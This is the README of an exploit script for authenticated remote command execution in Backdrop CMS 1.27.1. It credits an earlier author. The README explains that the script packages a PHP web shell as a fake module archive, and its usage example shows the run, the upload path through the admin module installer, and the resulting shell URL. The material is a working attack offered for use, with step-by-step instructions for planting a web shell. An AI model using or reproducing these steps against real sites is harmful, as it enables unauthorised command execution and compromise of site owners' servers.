# Backdrop CMS 1.27.1 - Authenticated Remote Command Execution RCE
The exploit creates .tar.gz file with PHP web shell inside.

The script is modification from original script developed by Ahmet Ümit BAYRAM. 

## Usage
```
python3 ./exploit.py http://vulnerable.com

Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.tar.gz
Go to http://vulnerable.com/admin/modules/install and upload the shell.tar.gz for Manual Installation.
Your shell address: http://vulnerable.com/modules/shell/shell.php
```
